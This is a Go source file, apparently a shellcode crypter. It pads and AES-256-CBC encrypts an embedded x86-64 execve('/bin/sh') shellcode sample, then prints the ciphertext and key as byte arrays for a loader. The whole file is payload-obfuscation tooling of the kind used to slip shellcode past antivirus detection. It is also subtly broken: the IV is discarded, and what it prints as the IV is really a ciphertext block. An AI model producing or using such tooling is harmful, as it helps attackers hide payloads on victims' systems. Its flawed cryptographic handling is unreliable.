package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
)

func EncryptShellcode(shellcode []byte) ([]byte, error) {
	// Generate a secure 256-bit key and IV
	key := make([]byte, 32)
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		return nil, err
	}
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	// Pad the shellcode
	padding := aes.BlockSize - (len(shellcode) % aes.BlockSize)
	for i := 0; i < padding; i++ {
		shellcode = append(shellcode, byte(padding))
	}

	// Create an AES-256 cipher block
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// Encrypt the shellcode using AES-256 in CBC mode
	ciphertext := make([]byte, len(shellcode))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext, shellcode)

	// Return the encrypted shellcode and key
	return append(ciphertext, key...), nil
}

func output_shellcode(shellcode []byte) {
	for i, b := range shellcode {
		if i != len(shellcode)-1 {
			fmt.Printf("0x%02x, ", b)
		} else {
			fmt.Printf("0x%02x", b)
		}
	}
}

func main() {

	// Example shellcode
	shellcode := []byte{0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0xD1, 0x9D, 0x96, 0x91, 0xD0, 0x8C, 0x97, 0xFF, 0x48, 0xf7, 0xdb, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05}
	// Encrypt the shellcode
	encryptedShellcode, err := EncryptShellcode(shellcode)
	if err != nil {
		fmt.Println("Error encrypting shellcode:", err)
		return
	}

	// Print the encrypted shellcode
	output_shellcode([]byte(encryptedShellcode))
	// Output the decryption key and IV
	fmt.Printf("\nKey: %x\n", encryptedShellcode[len(encryptedShellcode)-32:])
	fmt.Printf("IV: %x\n", encryptedShellcode[len(encryptedShellcode)-32-aes.BlockSize:len(encryptedShellcode)-32])
}
